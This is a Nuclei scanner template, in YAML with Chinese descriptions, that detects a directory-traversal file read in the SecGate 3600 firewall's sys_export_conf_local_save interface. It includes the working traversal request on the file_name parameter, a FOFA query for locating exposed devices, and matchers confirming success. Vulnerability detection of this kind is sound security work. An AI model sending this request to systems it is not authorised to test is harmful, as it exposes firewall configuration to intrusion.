id: secworld-secgate3600-obj-area-export-save-fileread

info:
  name: 网神 SecGate 3600 obj_area_export_save 任意文件读取
  author: Observer
  severity: high
  description: |
    网神 SecGate 3600 防火墙 sys_export_conf_local_save 接口 file_name 参数存在目录穿越，可读取系统配置文件。
  metadata:
    max-request: 1
    fofa-query: title="secgate 3600"
  tags: secgate,secworld,fileread,lfi

http:
  - method: GET
    path:
      - '{{BaseURL}}/?g=sys_export_conf_local_save&file_name=../modules/system/import_export.mds'

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - 'application/octet-stream'
          - 'modules/system/import_export.mds'
        condition: and

      - type: status
        status:
          - 200
